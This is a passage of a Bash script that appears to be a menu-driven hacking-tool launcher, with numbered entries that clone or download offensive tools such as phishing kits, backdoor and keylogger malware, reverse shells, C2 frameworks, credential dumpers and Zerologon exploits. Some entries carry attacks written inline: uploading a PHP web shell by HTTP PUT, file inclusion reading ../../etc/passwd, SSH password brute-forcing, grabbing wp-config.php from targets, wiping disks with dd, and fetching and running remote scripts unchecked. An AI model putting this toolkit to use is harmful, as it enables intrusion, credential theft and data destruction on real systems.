			Clona "blark/cli-phisher"
		fi
	;;
	"386")
		Scarica "$ENTRAW""sharyer/GSMEvil/master/ImsiEvil.py"
	;;
	"387")
		Clona "Oros42/IMSI-catcher"
	;;
	"388")
		Scarica "$ENTRAW""sharyer/GSMEvil/master/SmsEvil.py"
	;;
	"389")
		ipconfig
		echo "Choose an interface to intercept the traffic"
		read -p "(example, eth0): " NIC
		if [[ "$NIC" != "" ]];
		then
			tcpdump -ni $NIC -w packets.cap
		fi
	;;
	"390")
		Clona "lanmaster53/recon-ng"
	;;
	"391")
		Clona "methos2016/recon-ng"
	;;
	"392")
		Clona "zerosum0x0/koadic"
	;;
	"393")
		Clona "clr2of8/DPAT"
	;;
	"394")
		Clona "Jewel591/xssmap"
	;;
	"395")
		Clona "JettChenT/scan-for-webcams"
	;;
	"396")
		Clona "entynetproject/entropy"
	;;
	"397")
		Clona "indexnotfound404/spycam"
	;;
	"398")
		Clona "CCrashBandicot/IPCam"
	;;
	"399")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "nathan242/ipcam-cctv"
		fi
	;;
	"400")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Benehiko/GoNetworkCameraScanner"
		fi
	;;
	"401")
		Clona "vanpersiexp/expcamera"
	;;
	"402")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "TrustMe00/experience_synology_attack"
		fi
	;;
	"403")
		Clona "Screetsec/TheFatRat"
	;;
	"404")
		Clona "OWASP/Amass"
	;;
	"405")
		Clona "bkerler/android_universal"
	;;
	"406")
		Clona "0xInfection/XSRFProbe"
	;;
	"407")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "avinashkranjan/Malware-with-Backdoor-and-Keylogger"
		fi
	;;
	"408")
		Clona "AdrianVollmer/PowerHub"
	;;
	"409")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "tz4678/backshell"
		fi
	;;
	"410")
		Clona "mesquidar/adbsploit"
	;;
	"411")
		Clona "H4ckForJob/dirmap"
	;;
	"412")
		Clona "kurogai/nero-phishing-server"
	;;
	"413")
		Clona "KnightSec-Official/Phlexish"
	;;
	"414")
		Clona "hhhrrrttt222111/Dorkify"
	;;
	"415")
		Clona "Chr0m0s0m3s/DeadTrap"
	;;
	"416")
		Installa
	;;
	"417")
		echo "Digit a domain to get smtp data"
		read -p "(example, domain.com): " TRGDOM
		if [[ "$TRGDOM" != "" ]];
		then
			nslookup -q=mx "$TRGDOM"
		fi
	;;
	"418")
		Scarica "$ENTRAW""pentestmonkey/smtp-user-enum/master/smtp-user-enum.pl"
	;;
	"419")
		Scarica "$ENTRAW""altjx/ipwn/master/iSMTP/iSMTP.py"
	;;
	"420")
		Clona "techgaun/github-dorks"
	;;
	"421")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""tango-j/SMTP-Open-Relay-Attack-Test-Tool/master/OpenRelay.py"
		fi
	;;
	"422")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "crazywifi/SMTP_Relay_Phisher"
		fi
	;;
	"423")
		Scarica "$ENTRAW""NickSanzotta/smbShakedown/master/smbShakedown.py"
	;;
	"424")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""balaganeshgbhackers/Emailspoofing/master/Smtprelay.py"
		fi
	;;
	"425")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "RobinMeis/MITMsmtp"
		fi
	;;
	"426")
		Clona "mikechabot/smtp-email-spoofer-py"
	;;
	"427")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""yasserjanah/ZeS0MeBr/master/ZeS0MeBr.py"
			Scarica "$ENTRAW""yasserjanah/ZeS0MeBr/master""$RQRM"
		fi
	;;
	"428")
		Clona "tintinweb/striptls"
	;;
	"429")
		ls /dev/
		lsblk -o NAME,SIZE,LABEL,TYPE,RO,MOUNTPOINT,UUID
		echo "Select a device to wipe without /dev/"
		read -p "(example, sdd): " TDV
		if [[ "$TDV" != "" ]];
		then
			dd if=/dev/zero of=/dev/$TDV bs=1M
		fi
	;;
	"430")
		echo "Digit a fullpath file to wipe"
		read -p "(example, /home/username/logfile): " TFL
		if [[ "$TFL" != "" ]];
		then
			if [[ -f "$TFL" ]];
			then
				wipe -fs "$TFL"
			fi
		fi
	;;
	"431")
		echo "Digit a fullpath file to shred"
		read -p "(example, /home/username/logfile): " TFL
		if [[ "$TFL" != "" ]];
		then
			if [[ -f "$TFL" ]];
			then
				shred -fuz "$TFL"
			fi
		fi
	;;
	"432")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/android with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/android/$NOMEFL"
		fi
	;;
	"433")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/linux with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/linux/$NOMEFL"
		fi
	;;
	"434")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/linux_x86-64 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/linux_x86-64/$NOMEFL"
		fi
	;;
	"435")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/linux_x86 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/linux_x86/$NOMEFL"
		fi
	;;
	"436")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/windows with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/windows/$NOMEFL"
		fi
	;;
	"437")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/windows_x86-64 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/windows_x86-64/$NOMEFL"
		fi
	;;
	"438")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/windows_x86 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/windows_x86/$NOMEFL"
		fi
	;;
	"439")
		Clona "DarkSecDevelopers/HiddenEye"
	;;
	"440")
		Clona "fO-000/bluescan"
	;;
	"441")
		Clona "laramies/metagoofil"
	;;
	"442")
		Clona "Flo354/iOSForensic"
	;;
	"443")
		Clona "as0ler/iphone-dataprotection"
	;;
	"444")
		Scarica "$ENTRAW""jantrim/iosbackupexaminer/master/iosbackupexaminer.py"
	;;
	"445")
		Clona "evilsocket/kitsune"
	;;
	"446")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""aarsakian/MFTExtractor/master/MFTExtractor.go"
		fi
	;;
	"447")
		Clona "MillerTechnologyPeru/hcitool"
	;;
	"448")
		Clona "m0nad/HellRaiser"
	;;
	"449")
		Clona "RustScan/RustScan"
	;;
	"450")
		Clona "IFGHou/wapiti"
	;;
	"451")
		Clona "Ettercap/ettercap"
	;;
	"452")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Vulnerability-scanner/Lazy-RDP"
		fi
	;;
	"453")
		Clona "zt2/sqli-hunter"
	;;
	"454")
		Clona "MrSqar-Ye/BadMod"
	;;
	"455")
		Clona "future-architect/vuls"
	;;
	"456")
		Clona "almandin/fuxploider"
	;;
	"457")
		Clona "Moham3dRiahi/XAttacker"
	;;
	"458")
		Clona "s0md3v/Corsy"
	;;
	"459")
		Scarica "$ENTRAW""skavngr/rapidscan/master/rapidscan.py"
	;;
	"460")
		Clona "s0md3v/Silver"
	;;
	"461")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "haasosaurus/ace-voip"
		fi
	;;
	"462")
		Clona "royhills/arp-scan"
	;;
	"463")
		Clona "Zapotek/cdpsnarf"
	;;
	"464")
		Clona "fwaeytens/dnsenum"
	;;
	"465")
		Clona "wireghoul/dotdotpwn"
	;;
	"466")
		Clona "FortyNorthSecurity/EyeWitness"
	;;
	"467")
		Clona "JohnTroony/Blisqy"
	;;
	"468")
		Clona "n00py/WPForce"
	;;
	"469")
		Clona "BlackXploits/WPBrute"
	;;
	"470")
		Clona "HatBashBR/ShodanHat"
	;;
	"471")
		Scarica "$ENTRAW""jimywork/shodanwave/master/shodanwave.py"
		Scarica "$ENTRAW""jimywork/shodanwave/master""$RQRM"
	;;
	"472")
		Clona "random-robbie/My-Shodan-Scripts"
	;;
	"473")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "woj-ciech/Kamerka-GUI"
		fi
	;;
	"474")
		Scarica "$ENTRAW""m4ll0k/Shodanfy.py/master/shodanfy.py"
	;;
	"475")
		Clona "MS-WEB-BN/h4rpy"
	;;
	"476")
		Clona "sdnewhop/grinder"
	;;
	"477")
		Clona "gelim/censys"
	;;
	"478")
		Clona "twelvesec/gasmask"
	;;
	"479")
		Clona "SuperBuker/CamHell"
	;;
	"480")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""AndyCyberSec/direncrypt/master/direncrypt.py"
			Scarica "$ENTRAW""AndyCyberSec/direncrypt/master""$RQRM"
		fi
	;;
	"481")
		Clona "0xInfection/TIDoS-Framework"
	;;
	"482")
		Clona "francozappa/knob"
	;;
	"483")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "TheDevFromKer/CMS-Attack"
		fi
	;;
	"484")
		Clona "Dionach/CMSmap"
	;;
	"485")
		Clona "r3dxpl0it/TheXFramework"
	;;
	"486")
		Clona "sowdust/tafferugli"
	;;
	"487")
		Scarica "$ENTRAW""arthaud/git-dumper/master/git-dumper.py"
		Scarica "$ENTRAW""arthaud/git-dumper/master""$RQRM"
	;;
	"488")
		Clona "Taguar258/Raven-Storm"
	;;
	"489")
		Clona "david3107/squatm3"
	;;
	"490")
		Clona "netevert/dnsmorph"
	;;
	"491")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""TeamFoxtrot-GitHub/DNSMap/master/dnsmap.py"
		fi
	;;
	"492")
		Clona "darkoperator/dnsrecon"
	;;
	"493")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""neiltyagi/DNSRECON/master/dnsrecon.py"
			Scarica "$ENTRAW""neiltyagi/DNSRECON/master/subdomain.txt"
		fi
	;;
	"496")
		Clona "rs/dnstrace"
	;;
	"497")
		Clona "redsift/dnstrace"
	;;
	"498")
		Clona "dkorunic/dnstrace"
	;;
	"499")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""hyp3rlinx/DarkFinger-C2/master/DarkFinger-C2.py"
		fi
	;;
	"500")
		Clona "nettitude/PoshC2"
	;;
	"501")
		Clona "LukaSikic/subzy"
	;;
	"502")
		Clona "sensepost/godoh"
	;;
	"503")
		Clona "lu4p/ToRat"
	;;
	"504")
		Clona "airbus-seclab/android_emuroot"
	;;
	"505")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "joswr1ght/btfind"
		fi
	;;
	"506")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Aarif123456/passwordCracker"
		fi
	;;
	"507")
		Scarica "$ENTRAW""GauthamGoli/rar-Password-Cracker/master/bruteforce.py"
	;;
	"508")
		Clona "risksense/zerologon"
		Scarica "$ENTRAW""SecureAuthCorp/impacket/master/examples/secretsdump.py"
	;;
	"509")
		Clona "bb00/zer0dump"
	;;
	"510")
		Clona "VoidSec/CVE-2020-1472"
	;;
	"511")
		Clona "Isaacdelly/Plutus"
	;;
	"512")
		Clona "dan-v/bruteforce-bitcoin-brainwallet"
	;;
	"513")
		Clona "SMH17/bitcoin-hacking-tools"
	;;
	"514")
		Clona "maxlandon/wiregost"
	;;
	"515")
		Clona "3v4Si0N/HTTP-revshell"
	;;
	"516")
		Scarica "$ENTRAW""NotMedic/NetNTLMtoSilverTicket/master/dementor.py"
	;;
	"517")
		Clona "dwisiswant0/crlfuzz"
	;;
	"518")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/bmp.pl"
	;;
	"519")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/gif.pl"
	;;
	"520")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/jpg.pl"
	;;
	"521")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/png.pl"
	;;
	"522")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/webp.pl"
	;;
	"523")
		Clona "nerodtm/ReconCobra---Complete-Automated-Pentest-Framework-For-Information-Gathering"
	;;
	"524")
		Scarica "$ENTRAW""tothi/rbcd-attack/master/rbcd.py"
	;;
	"525")
		Clona "jetmore/swaks"
	;;
	"526")
                Scarica "$ENTRAW""0x90/vpn-arsenal/master/IKEProber.pl"
                Scarica "$ENTRAW""0x90/vpn-arsenal/master/ikecrack-snarf-1.00.pl"
	;;
	"527")
		Clona "Moham3dRiahi/XAttacker"
	;;
	"528")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "mfocuz/DNS_Hunter"
		fi
	;;
	"529")
                Scarica "$ENTRAW""riusksk/StrutScan/master/StrutScan.pl"
	;;
	"530")
		Clona "AlisamTechnology/ATSCAN"
	;;
	"531")
		Clona "CERT-Polska/hfinger"
	;;
	"532")
                Scarica "$ENTRAW""Phoenix1112/subtakeover/master/takeover.py"
                Scarica "$ENTRAW""Phoenix1112/subtakeover/master""$RQRM"
	;;
	"533")
		Clona "securing/DumpsterDiver"
	;;
	"534")
		if [[ $(Warning) == "Y" ]];
		then
	                Scarica "$ENTRAW""TheNittam/RPOscanner/master/rpo.py"
		fi
	;;
	"535")
		Clona "nil0x42/cracking-utils"
	;;
	"536")
		Clona "Pure-L0G1C/Loki"
	;;
	"537")
		Clona "adnane-X-tebbaa/Katana"
	;;
	"538")
		if [[ $(Warning) == "Y" ]];
		then
	                Scarica "$ENTRAW""smackerdodi/CVE-bruter/master/CVE-bruter.py"
	                Scarica "$ENTRAW""smackerdodi/CVE-bruter/master""$RQRM"
		fi
	;;
	"539")
		ls
		echo "Digit a file to clear metadata in it"
		read -p "(example, photo.jpg): " PHT
		if [[ -f "$PHT" ]];
		then
			exiftool -all= "$PHT"
		fi
	;;
	"540")
		Clona "blunderbuss-wctf/wacker"
	;;
	"541")
		Clona "wifiphisher/wifiphisher"
	;;
	"542")
		Clona "digininja/CeWL"
	;;
	"543")
                Scarica "$ENTSSL""praetorian-inc/trident/releases/download/v0.1.3/trident_0.1.3_linux_i386.tar.gz"
	;;
	"544")
                Scarica "$ENTSSL""praetorian-inc/trident/releases/download/v0.1.3/trident_0.1.3_linux_x86_64.tar.gz"
	;;
	"545")
		Clona "praetorian-inc/trident"
	;;
	"546")
		Clona "tstillz/webshell-scan"
	;;
	"547")
		Scarica "$ENTRAW""jofpin/fuckshell/master/fuckshell.py"
	;;
	"548")
		Clona "followboy1999/webshell-scanner"
	;;
	"549")
		Clona "emposha/Shell-Detector"
	;;
	"550")
		Clona "calebmadrigal/trackerjacker"
	;;
	"551")
		Scarica "$ENTRAW""Cyb0r9/SocialBox/master/SocialBox.sh"
		Scarica "$ENTRAW""Cyb0r9/SocialBox/master/install-sb.sh"
	;;
	"552")
		Clona "MobSF/Mobile-Security-Framework-MobSF"
	;;
	"553")
		Scarica "$ENTRAW""Ebryx/GitDump/master/git-dump.py"
	;;
	"554")
		Clona "FluxionNetwork/fluxion"
	;;
	"555")
		Clona "m8r0wn/subscraper"
	;;
	"556")
		Clona "LordNeoStark/tugarecon"
	;;
	"557")
		Clona "knassar702/scant3r"
	;;
	"558")
		Clona "dwisiswant0/findom-xss"
	;;
	"559")
		Clona "epi052/feroxbuster"
	;;
	"560")
		Clona "Datalux/Osintgram"
	;;
	"561")
		echo "Digit an url with protocol and get parameter with equal sign"
		read -p "(example, http://site.web/news.php?file=): " URL
		if [[ "$URL" != "" ]];
		then
			echo "Digit the file name or path, even with directory traversal, to encode in base64"
			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
			if [[ "$PAGE" != "" ]];
			then
				curl "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
			fi
		fi
	;;
	"562")
		Clona "tennc/webshell"
	;;
	"563")
		Scarica "$ENTRAW""Viralmaniar/Passhunt/master/passhunt.py"
		Scarica "$ENTRAW""Viralmaniar/Passhunt/master""$RQRM"
		Scarica "$ENTRAW""Viralmaniar/Passhunt/master/vendors.txt"
	;;
	"564")
		Clona "vanhienfs/saycheese"
	;;
	"565")
		Scarica "$ENTRAW""AnonymousAt3/cyberdoor/main/cyberdoor"
	;;
	"566")
		Clona "0xAbdullah/0xWPBF"
	;;
	"567")
		Clona "Leviathan36/kaboom"
	;;
	"568")
		Clona "archerysec/archerysec"
	;;
	"569")
		Clona "commixproject/commix"
	;;
	"570")
		Clona "hegusung/RPCScan"
	;;
	"571")
		Clona "sensepost/ruler"
	;;
	"572")
		Scarica "$ENTRAW""1N3/ReverseAPK/master/reverse-apk"
		Scarica "$ENTRAW""1N3/ReverseAPK/master/install"
	;;
	"573")
		Clona "robre/scripthunter"
	;;
	"574")
		Clona "epinna/weevely3"
	;;
	"575")
		Clona "MS-WEB-BN/c41n"
	;;
	"576")
		Clona "Veil-Framework/Veil"
	;;
	"577")
		Clona "KuroLabs/stegcloak"
	;;
	"578")
		Scarica "$ENTRAW""CiscoCXSecurity/creddump7/master/cachedump.py"
		Scarica "$ENTRAW""CiscoCXSecurity/creddump7/master/lsadump.py"
		Scarica "$ENTRAW""CiscoCXSecurity/creddump7/master/pwdump.py"
	;;
	"579")
		Scarica "$ENTRAW""AnonymousAt3/cybermap/main/cybermap.sh"
		Scarica "$ENTRAW""AnonymousAt3/cybermap/main/ip-list.txt"
	;;
	"580")
		Clona "JPaulMora/Pyrit"
	;;
	"581")
		Clona "EnableSecurity/wafw00f"
	;;
	"582")
		Clona "byt3bl33d3r/arpspoof"
	;;
	"583")
		Scarica "$ENTRAW""ammarx/ARP-spoofing/master/src/mmattack.py"
	;;
	"584")
		Scarica "$ENTRAW""BusesCanFly/rpi-hunter/master/rpi-hunter.py"
	;;
	"585")
		Clona "thewhiteh4t/FinalRecon"
	;;
	"586")
		Clona "saeeddhqan/evine"
	;;
	"587")
		Clona "PaperMtn/lil-pwny"
	;;
	"588")
		Clona "AzizKpln/Moriarty-Project"
	;;
	"589")
		Clona "mxrch/GHunt"
	;;
	"590")
		Clona "1tayH/noisy"
	;;
	"591")
		Clona "hash3liZer/WiFiBroot"
	;;
	"592")
		Clona "SValkanov/wifivoid"
	;;
	"593")
		Clona "TryCatchHCF/PacketWhisper"
	;;
	"594")
		Clona "r3vn/badKarma"
	;;
	"595")
		Scarica "$ENTRAW""7Elements/Fortigate/master/fortigate.py"
		Scarica "$ENTRAW""7Elements/Fortigate/master""$RQRM"
	;;
	"596")
		echo "Digit a remote IP target without protocol"
		read -p "(example, 192.168.0.12): " IP
		if [[ "$IP" != "" ]];
		then
			echo "Digit a folder shared in smb or samba from remote IP target"
			read -p "(example, backups): " FLD
			if [[ "$FLD" != "" ]];
			then
				echo "Digit an username or username%password of remote IP target"
				read -p "(example, admin or admin%password1234): " USR
				if [[ "$USR" != "" ]];
				then
					smbget -R "smb://""$IP""/""$FLD" -U "$USR"
				fi
			fi
		fi
	;;
	"597")
		Clona "googleprojectzero/fuzzilli"
	;;
	"598")
		echo "Digit a remote URL or IP target with protocol"
		read -p "(example, http://site.web or http://192.168.0.12): " URL
		if [[ "$URL" != "" ]];
		then
			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget "$URL""/""$FILE"; done
		fi
	;;
	"599")
		Clona "utkusen/urlhunter"
	;;
	"600")
		echo "Digit a remote URL or IP target with protocol"
		read -p "(example, http://site.web or http://192.168.0.12): " URL
		if [[ "$URL" != "" ]];
		then
			echo "Digit a cool shell name without extension to avoid blocks"
			read -p "(example, wsh3ll): " SHL
			if [[ "$SHL" != "" ]];
			then
				curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
			fi
		fi
	;;
	"601")
		Scarica "$ENTRAW""UnaPibaGeek/ctfr/master/ctfr.py"
		Scarica "$ENTRAW""UnaPibaGeek/ctfr/master""$RQRM"
	;;
	"602")
		Clona "nil0x42/phpsploit"
	;;
	"603")
		Clona "Paradoxis/StegCracker"
	;;
	"604")
		Clona "qsecure-labs/overlord"
	;;
	"605")
		Clona "shadowlabscc/Kaiten"
	;;
	"606")
		Clona "Chudry/Xerror"
	;;
	"607")
		Clona "thewhiteh4t/seeker"
	;;
	"608")
		Clona "jackrendor/cookiedoor"
	;;
	"609")
		Scarica "$ENTRAW""pentestmonkey/finger-user-enum/master/finger-user-enum.pl"
	;;
	"610")
		Clona "audibleblink/doxycannon"
	;;
	"611")
		Clona "jmk-foofus/medusa"
	;;
	"612")
		Clona "openwall/john"
	;;
	"613")
		Scarica "$ENTRAW""bdblackhat/admin-panel-finder/master/admin_panel_finder.py"
		Scarica "$ENTRAW""bdblackhat/admin-panel-finder/master/link.txt"
	;;
	"614")
		Scarica "$ENTRAW""dariusztytko/jwt-key-id-injector/master/injector.py"
	;;
	"615")
		pkg update && pkg upgrade -y && pkg install curl wget tsu wget git && wget --no-check-certificate "$ENTRAW""Hax4us/Metasploit_termux/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
	;;
	"616")
		Clona "rajkumardusad/Tool-X"
	;;
	"617")
		echo "Digit an exploit file name without extension"
		read -p "(example, 460): " EXPL
		if [[ "$EXPL" != "" ]];
		then
			Scarica "https://www.exploit-db.com/download/""$EXPL"
		fi
	;;
	"618")
		echo "Digit a remote IP"
		read -p "(example, 192.168.1.12): " TRG
		if [[ "$TRG" != "" ]];
		then
			echo "Digit a wordlist usernames file path"
			read -p "(example, /usr/share/wordlist/users.txt): " USRF
			if [[ "$USRF" != "" ]];
			then
				if [[ -f "$USRF" ]];
				then
					for USERN in $(cat "$USRF"); do finger -l "$USRF""@""$TRG"; done
				fi
			fi
		fi
	;;
	"619")
		Scarica "$ENTRAW""cddmp/enum4linux-ng/master/enum4linux-ng.py"
		Scarica "$ENTRAW""cddmp/enum4linux-ng/master""$RQRM"
	;;
	"620")
		Clona "hahwul/XSpear"
	;;
	"621")
		Clona "s0md3v/Arjun"
	;;
	"622")
		wget --no-check-certificate "$ENTRAW""1Tech-X/Auxilus.github.io/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
	;;
	"623")
		Clona "r0oth3x49/Xpath"
	;;
	"624")
		wget --no-check-certificate "$ENTLAB""st42/termux-sudo/-/raw/master/sudo" -O /data/data/com.termux/files/usr/bin/sudo
		chmod 700 /data/data/com.termux/files/usr/bin/sudo
	;;
	"625")
		Scarica "$ENTRAW""TermuxHacking000/phonia/main/phonia.sh"
		Scarica "$ENTSSL""TermuxHacking000/phonia/raw/main/phonia.zip"
	;;
	"626")
		Clona "GoVanguard/legion"
	;;
	"627")
		Clona "w-digital-scanner/w13scan"
	;;
	"628")
		echo "Digit target IP or URL"
		read -p "(example  192.168.168.12 or http://something.dark): " TIP
		if [[ "$TIP" != "" ]];
		then
			echo "Digit target username"
			read -p "(example, john): " USR
			if [[ "$USR" != "" ]];
			then
				echo "Digit target domain"
				read -p "(example, john-pc): " DMN
				if [[ "$DMN" != "" ]];
				then
					echo "Digit a wordlist password file path"
					read -p "(example, /usr/share/wordlist/rockyou.txt): " WFL
					if [[ -f "$WFL" ]];
					then
						echo "Digit a LOCAL PORT for port forwarding (optional)"
						read -p "(example, 8080) default 22: " LPRT
						if [[ "$LPRT" == "" ]];
						then
							LPRT="22"
						fi
						echo "Digit a REMOTE PORT for port forwarding (optional)"
						read -p "(example, 80) default 22: " RPRT
						if [[ "$RPRT" == "" ]];
						then
							RPRT="22"
						fi
						for PASS in $(cat "$WFL"); do sshpass -p "$PASS" ssh -L "$LPRT"":""$TIP"":""$RPRT" "$USR""@""$DMN"; done
					fi
				fi
			fi
		fi
	;;
	"629")
		Clona "voipmonitor/sniffer"
	;;
	"630")
		Clona "beurtschipper/Depix"
	;;
	"631")
		Clona "Anon-Exploiter/SiteBroker"
	;;
	"632")
		Clona "x90skysn3k/brutespray"
	;;
	"633")
		Scarica "$ENTRAW""TermuxHacking000/distrux/main/distrux.sh"
	;;
	"634")
		Clona "TermuxHacking000/SysO-Termux"
	;;
	"635")
		Scarica "$ENTRAW""TermuxHacking000/PortmapSploit/master/PortmapSploit.sh"
		Scarica "$ENTRAW""TermuxHacking000/PortmapSploit/master/Colors.sh"
	;;
	"636")
		Scarica "$ENTRAW""xFreed0m/RDPassSpray/master/RDPassSpray.py"
		Scarica "$ENTRAW""xFreed0m/RDPassSpray/master""$RQRM"
	;;
	"637")
		Scarica "$ENTRAW""Viralmaniar/Remote-Desktop-Caching-/master/remotecache.py"
		Scarica "$ENTRAW""Viralmaniar/Remote-Desktop-Caching-/master""$RQRM"
	;;
	"638")
		echo "Digit a target IP"
		read -p "(example, 192.168.168.125): " TIP
		if [[ "$TIP" != "" ]];
		then
			echo 'stats items' | nc "$TIP" 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
		fi
	;;
	"639")
		Clona "RUB-NDS/PRET"
	;;
	"640")
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easysploit/master/easysploit"
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easysploit/master/installer.sh"
	;;
	"641")
		Clona "m4ll0k/Konan"
	;;
	"642")
		Scarica "$ENTRAW""th3unkn0n/facebash-termux/master/facebash.sh"
		Scarica "$ENTRAW""th3unkn0n/facebash-termux/master/install.sh"
	;;
	"643")
		echo "Digit a remote domain target"
		read -p "(example, example.com): " TDM
		if [[ "$TDM" != "" ]];
		then
			echo "Select an output form"
			echo -ne "0. standard\n1. range\n2. hex\n3. octal\n4. binary\n5. CIDR\n"
			read -p "(example, 1): " OPT
			if [[ "$OPT" != "" ]];
			then
				case "$OPT" in
				"0")
					netmask -s "$TDM"
				;;
				"1")
					netmask -r "$TDM"
				;;
				"2")
					netmask -x "$TDM"
				;;
				"3")
					netmask -o "$TDM"
				;;
				"4")
					netmask -b "$TDM"
				;;
				"5")
					netmask -c "$TDM"
				;;
				esac
			fi
		fi
	;;
	"644")
		Clona "Pr0x13/iDict"
	;;
	"645")
		Clona "foozzi/iCloudBrutter"
	;;
	"646")
		Clona "nandydark/grim"
	;;
	"647")
		Clona "vchinnipilli/kubestrike"
	;;
	"648")
		Clona "cyberark/KubiScan"
	;;
	"649")
		echo "Digit a tar.gz file full path to extract"
		ls *.tar.gz
		read -p "(example, ./example.tar.gz): " FLTR
		if [[ -f "$FLTR" ]];
		then
			tar zxvf "$FLTR"
		fi
	;;
	"650")
		Clona "edoardottt/scilla"
	;;
	"651")
		Clona "leebaird/discover"
	;;
	"652")
		echo "Digit an IP target with protocol to get docker version"
		read -p "(example, http://19.20.21.22): " TIP
		if [[ "$TIP" != "" ]];
		then
			echo "Digit the Docker port target"
			read -p "(default, 2376): " TTDP
			TDP=2376
			if [[ "$TTDP" != "" ]];
			then
				if [[ "$TTDP" =~ ^[0-9]+$ ]];
				then
					TDP="$TTDP"
				fi
			fi
			curl -s "$TIP"":""$TDP""/version" | python -m json.tool
		fi
	;;
	"653")
		Clona "adnane-X-tebbaa/GRecon"
	;;
	"654")
		Scarica "$ENTRAW""Rover141/Shellter/master/shellter"
	;;
	"655")
		Scarica "$ENTRAW""Moham3dRiahi/WPGrabInfo/master/WP-Grab.pl"
	;;
	"656")
		Scarica "$ENTRAW""spicesouls/reosploit/main/reosploit.py"
		Scarica "$ENTRAW""spicesouls/reosploit/main""$RQRM"
	;;
	"657")
		Clona "sa7mon/S3Scanner"
	;;
	"658")
		Clona "SimplySecurity/SimplyEmail"
	;;
	"659")
		Clona "aljazceru/s3-bucket-scanner"
	;;
	"660")
		Clona "ankane/s3tk"
	;;
	"661")
		Scarica "$ENTRAW""bear/s3scan/master/s3scan.py"
	;;
	"662")
		Clona "haroonawanofficial/Amazon-AWS-Hack"
	;;
	"663")
		Clona "nagwww/101-AWS-S3-Hacks"
	;;
	"664")
		Clona "aquasecurity/cloudsploit"
	;;
	"665")
		Scarica "$ENTRAW""jos666/itunes_hack/master/itunes.py"
	;;
	"666")
		Clona "yuejd/ios_Restriction_PassCode_Crack---Python-version"
	;;
	"667")
		Scarica "$ENTRAW""ShayanDeveloper/WordPress-Hacker/master/WordPress%20Hacker.py"
	;;
	"668")
		Scarica "$ENTRAW""Jamalc0m/wphunter/master/wphunter.php"
	;;
	"669")
		echo "Digit an executable file name to analyze"
		read -p "(example, ./sysinfo): " EXF
		if [[ -f "$EXF" ]];
		then
			echo "Digit a report file name"
			read -p "(example, sysinfo): " RPF
			if [[ "$RPF" != "" ]];
			then
				strace -f -i -o "$RPF"".strace" "$EXF"
				ltrace -f -i -o "$RPF"".ltrace" "$EXF"
			fi
		fi
	;;
	"670")
		Clona "doyensec/ajpfuzzer"
	;;
	"671")
		Clona "localh0t/backfuzz"
	;;
	"672")
		Clona "RootUp/BFuzz"
	;;
	"673")
		Clona "CENSUS/choronzon"
	;;
	"674")
		Clona "dobin/ffw"
	;;
	"675")
